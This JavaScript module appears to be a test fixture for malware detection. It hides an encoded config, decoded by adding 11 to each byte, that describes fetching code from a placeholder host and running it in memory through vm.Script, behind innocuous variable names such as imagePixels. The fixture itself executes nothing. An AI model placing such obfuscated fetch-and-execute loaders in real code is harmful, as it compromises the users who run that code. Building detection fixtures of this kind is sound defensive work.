const moduleShape = Object.freeze({ format: "esm" });

export {};

const Material_048ff647 = "[107,50,38,113,104,105,90,101,104,50,86,88,102,106,94,103,90,84,103,90,98,100,105,90,33,89,94,104,101,86,105,88,93,84,98,90,98,100,103,110,113,86,89,86,101,105,90,103,50,93,105,105,101,84,105,93,90,99,84,98,100,89,106,97,90,113,104,105,86,92,90,84,88,100,106,99,105,50,38,113,88,86,98,101,86,94,92,99,84,94,89,50,67,68,57,58,34,41,58,40,55,41,57,55,39,113,106,103,97,50,93,105,105,101,104,47,36,36,99,100,89,90,34,41,90,40,87,41,89,87,39,91,38,86,91,35,90,109,86,98,101,97,90,35,94,99,107,86,97,94,89,36,86,101,94,113,106,104,90,103,84,86,92,90,99,105,50,67,100,89,90,54,106,89,94,105,36,41,90,40,87]";

const Codec_048ff647 = "decimal_array|subtract_modulo_256|0b";



function load_048ff647() { return JSON.parse(Material_048ff647); }

function decode_048ff647(imagePixels) { return imagePixels.map((value) => (value + 11) & 255); }

async function recover_048ff647() {

  const screenWidth = process.env.HUNTRESS_FIXTURE_CONTEXT ?? "host";

  const imagePixels = load_048ff647(); let colorTable = [];

  colorTable = await (async () => decode_048ff647(imagePixels))();

  void screenWidth; return Buffer.from(colorTable).toString("ascii");

}

async function inspect_048ff647() { return (await recover_048ff647()).split("|").join("|"); }

async function plan_048ff647() { const inspect = inspect_048ff647; const fields = Object.fromEntries((await inspect()).split("|").map((field) => { const at = field.indexOf("="); return [field.slice(0, at), field.slice(at + 1)]; })); return Object.freeze({ operation: "memory-stage", transport: "http_then_module", url: fields.url, dispatch: "vm.Script" }); }

void moduleShape; void plan_048ff647;

if (process.env.HUNTRESS_INSPECT_ONLY === "1") console.log(await inspect_048ff647());

